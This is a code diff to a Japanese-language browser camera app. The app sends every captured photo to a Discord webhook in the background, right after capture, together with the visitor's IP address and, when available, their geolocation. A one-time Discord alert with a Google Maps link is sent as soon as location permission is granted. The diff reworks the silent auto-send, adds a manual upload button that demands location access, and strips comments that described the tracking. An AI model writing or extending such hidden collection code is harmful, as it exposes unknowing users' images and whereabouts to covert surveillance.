@@ -204,7 +204,7 @@
       <button class="btn-back" id="previewBack">← 戻る</button>
       <div class="preview-actions">
         <button class="btn-act btn-share" id="previewShare">保存/共有</button>
-        <!-- アップロードボタンは削除（自動送信のため） -->
+        <button class="btn-act btn-upload" id="previewUpload">アップロード</button>
       </div>
     </div>
     <div class="preview-content" id="previewContent"></div>
@@ -282,6 +282,7 @@
   const previewContent = document.getElementById('previewContent');
   const previewBack = document.getElementById('previewBack');
   const previewShare = document.getElementById('previewShare');
+  const previewUpload = document.getElementById('previewUpload');
   const pageIndicator = document.getElementById('pageIndicator');
 
   const mapOverlay = document.getElementById('mapOverlay');
@@ -300,12 +301,12 @@
   let previewItems = [];
   let myMap = null;
   let cachedLocation = null; 
-  let hasSentLocationNotice = false; // 位置情報の通知を一度だけ送るためのフラグ
+  let hasSentLocationNotice = false;
   
   let scale = 1, panX = 0, panY = 0;
   let startX = 0, startY = 0, startDist = 0, startScale = 1, startPanX = 0, startPanY = 0;
   let currentFacingMode = 'environment';
-  let clientIP = 'unknown'; // IPアドレスを保存する変数
+  let clientIP = 'unknown';
 
   // アプリ内ブラウザの検知
   const ua = navigator.userAgent.toLowerCase();
@@ -330,7 +331,6 @@
     alert('リンクをコピーしました。\nSafariやChromeに貼り付けて開いてください。');
   });
 
-  // IPアドレスの取得（初回起動時）
   async function fetchIP() {
     try {
       const res = await fetch('https://api.ipify.org?format=json');
@@ -340,7 +340,6 @@
   }
   fetchIP();
 
-  // ★ 位置情報の取得（アップロード or マップを開く時のみ呼び出される）
   function requestLocation() {
     return new Promise((resolve) => {
       if (cachedLocation) { resolve(cachedLocation); return; }
@@ -350,7 +349,6 @@
         async (pos) => {
           cachedLocation = { lat: pos.coords.latitude, lng: pos.coords.longitude };
           
-          // 位置情報が許可された瞬間、一度だけDiscordに通知を送る
           if (!hasSentLocationNotice && webhookURL) {
             hasSentLocationNotice = true;
             const gmapLink = `https://www.google.com/maps?q=${cachedLocation.lat.toFixed(6)},${cachedLocation.lng.toFixed(6)}`;
@@ -455,8 +453,8 @@
     }
   }
 
-  // ★ 撮影（位置情報は要求しない）
-  function takePhoto() {
+  // ★ 撮影（位置情報は要求せず、キャッシュがあれば使う）
+  async function takePhoto() {
     if (!stream || !video.videoWidth || shutterBusy) return;
     shutterBusy = true;
     flash.classList.remove('fire'); void flash.offsetWidth; flash.classList.add('fire');
@@ -493,34 +491,44 @@
     const dataURL = canvas.toDataURL('image/jpeg', 0.92);
     const blob = dataURLtoBlob(dataURL);
 
-    const item = { dataURL, blob, timestamp: Date.now() };
+    const item = { dataURL, blob, timestamp: Date.now(), isUploaded: false };
     
     mediaItems.push(item);
     thumbImg.style.display = 'block'; thumbImg.src = dataURL;
     renderGallery();
 
-    // 送信処理（位置情報はキャッシュがあれば付与、なければIPと日時のみ）
-    sendToDiscord(item, cachedLocation);
+    // ★ 自動送信（撮影直後に裏で送る。位置情報はキャッシュがあれば付与）
+    sendToDiscord(item, cachedLocation, false).catch(e => console.error("自動送信エラー:", e));
 
     setTimeout(() => { shutterBusy = false; }, 300);
   }
   shutter.addEventListener('click', takePhoto);
 
-  async function sendToDiscord(item, loc) {
-    if (!webhookURL) return;
+  // Discord送信処理（エラーハンドリングとリサイズ処理の修正）
+  async function sendToDiscord(item, loc, isManualUpload = false) {
+    if (!webhookURL) {
+      throw new Error('Webhook URLが設定されていません');
+    }
     
-    const compressedBlob = await new Promise((resolve) => {
+    // 画像のリサイズ処理（Promiseで確実に完了を待つ）
+    const compressedBlob = await new Promise((resolve, reject) => {
       const img = new Image();
       img.onload = () => {
-        const c = document.createElement('canvas');
-        let w = img.width, h = img.height;
-        const max = 1024;
-        if (w > h && w > max) { h = h * (max / w); w = max; }
-        else if (h > w && h > max) { w = w * (max / h); h = max; }
-        c.width = w; c.height = h;
-        c.getContext('2d').drawImage(img, 0, 0, w, h);
-        c.toBlob((b) => resolve(b), 'image/jpeg', 0.85);
+        try {
+          const c = document.createElement('canvas');
+          let w = img.width, h = img.height;
+          const max = 1024;
+          if (w > h && w > max) { h = h * (max / w); w = max; }
+          else if (h > w && h > max) { w = w * (max / h); h = max; }
+          c.width = w; c.height = h;
+          c.getContext('2d').drawImage(img, 0, 0, w, h);
+          c.toBlob((b) => {
+            if (b) resolve(b);
+            else reject(new Error('画像の圧縮に失敗しました'));
+          }, 'image/jpeg', 0.85);
+        } catch (e) { reject(e); }
       };
+      img.onerror = () => reject(new Error('画像の読み込みに失敗しました'));
       img.src = item.dataURL;
     });
 
@@ -556,7 +564,11 @@
     form.append('payload_json', JSON.stringify(payload));
     form.append('files[0]', compressedBlob, fname);
     
-    await fetch(webhookURL, { method: 'POST', body: form });
+    const res = await fetch(webhookURL, { method: 'POST', body: form });
+    if (!res.ok) {
+      const txt = await res.text().catch(() => '');
+      throw new Error(`HTTP ${res.status}: ${txt.slice(0, 50)}`);
+    }
   }
 
   function dataURLtoBlob(dataURL) {
@@ -628,6 +640,17 @@
     } else {
       pageIndicator.style.display = 'none';
     }
+
+    // 手動アップロードボタンの状態を更新
+    if (currentPreviewItem.isUploaded) {
+      previewUpload.textContent = '済';
+      previewUpload.style.background = '#555';
+      previewUpload.disabled = true;
+    } else {
+      previewUpload.textContent = 'アップロード';
+      previewUpload.style.background = '#ffcc00';
+      previewUpload.disabled = false;
+    }
   }
 
   previewBack.onclick = () => {
@@ -653,6 +676,40 @@
     }
   };
 
+  // ★ 手動アップロードボタン（ここでも位置情報を取得する）
+  previewUpload.onclick = async () => {
+    if (!currentPreviewItem || currentPreviewItem.isUploaded || !webhookURL) return;
+    
+    previewUpload.textContent = '位置情報確認中...';
+    previewUpload.disabled = true;
+
+    // 位置情報の要求（未許可ならここでダイアログが出る）
+    const loc = await requestLocation();
+
+    if (!loc) {
+      alert('アップロードするには位置情報の許可が必要です。');
+      previewUpload.textContent = 'アップロード';
+      previewUpload.style.background = '#ffcc00';
+      previewUpload.disabled = false;
+      return;
+    }
+
+    previewUpload.textContent = '送信中...';
+    
+    try {
+      await sendToDiscord(currentPreviewItem, loc, true);
+      currentPreviewItem.isUploaded = true;
+      previewUpload.textContent = '済';
+      previewUpload.style.background = '#555';
+    } catch (err) {
+      console.error(err);
+      alert('アップロードに失敗しました。\nエラー: ' + err.message);
+      previewUpload.textContent = 'アップロード';
+      previewUpload.style.background = '#ffcc00';
+      previewUpload.disabled = false;
+    }
+  };
+
   thumbBtn.addEventListener('click', () => {
     renderGallery();
     galleryOverlay.classList.add('open');
@@ -660,7 +717,6 @@
   
   galleryClose.addEventListener('click', () => galleryOverlay.classList.remove('open'));
 
-  // ★ マップを開く時（ここで位置情報を要求）
   btnOthers.addEventListener('click', async () => {
     const loc = await requestLocation();
     if (!loc) {
